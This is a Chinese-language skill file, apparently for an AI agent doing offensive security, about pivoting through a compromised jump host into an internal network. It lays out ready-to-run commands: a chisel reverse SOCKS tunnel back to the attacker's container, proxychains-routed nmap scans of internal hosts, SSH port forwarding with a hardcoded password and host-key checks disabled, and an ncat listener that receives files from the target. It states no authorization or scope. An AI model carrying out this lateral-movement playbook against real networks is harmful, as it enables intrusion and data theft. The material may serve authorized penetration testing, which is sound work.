---
name: tunnel-proxy
description: 需要打通内网通道、做端口转发或 SOCKS 代理时使用：chisel 反向隧道、ssh -L/-D 端口转发、proxychains4 让工具走代理、ncat 传文件与兜底监听；拿到一台跳板机后向内网横向时想到它
---

## 用法

* chisel 是主力：容器内起 server，目标上跑 client 反向回连，得到 SOCKS5 入口
* 有 SSH 凭据时优先用 ssh 自带转发，少一个落地文件
* 所有监听端口先 `ss -tlnp` 查冲突，分配记录到 `tunnel/` 笔记

chisel 服务端（容器内监听，允许反向转发）：

```bash
mkdir -p tunnel && chisel server -p 9000 --reverse | tee tunnel/chisel-server.log
```

chisel 客户端（在跳板机上执行，反向 SOCKS5，容器侧 127.0.0.1:1080）：

```bash
chisel client <容器IP>:9000 R:socks
```

工具走 SOCKS 代理打内网（确认 /etc/proxychains4.conf 指向 127.0.0.1:1080）：

```bash
proxychains4 -q nmap -sT -Pn -p 80,445,3389 172.16.1.10 -oN tunnel/nmap-via-proxy.txt
```

SSH 本地端口转发（把内网 172.16.1.10:80 映射到本机 8080）：

```bash
sshpass -p '<密码>' ssh -N -L 8080:172.16.1.10:80 -o StrictHostKeyChecking=no user@10.0.0.5
```

ncat 收文件（对端 `ncat <容器IP> 9999 < file`）：

```bash
ncat -nlvp 9999 > tunnel/received.bin
```

## 规则

- 隧道/监听是前台长驻进程，生命周期不超过当前时间片：结束前主动断开，下个时间片按 `tunnel/` 里的记录重建
- 严禁 `nohup`/`setsid`/`&` 让隧道脱离执行片，失控的隧道会长期占用端口并暴露通道
- 经代理的扫描天然慢且只能 TCP connect（-sT），缩小端口范围、压低速率，不要全端口硬扫
- 每条隧道记录五要素落盘：本端端口、对端地址、协议、凭据位置、建立命令，便于断后重建
- 传文件优先走已建立的隧道，不要在目标上额外开监听端口
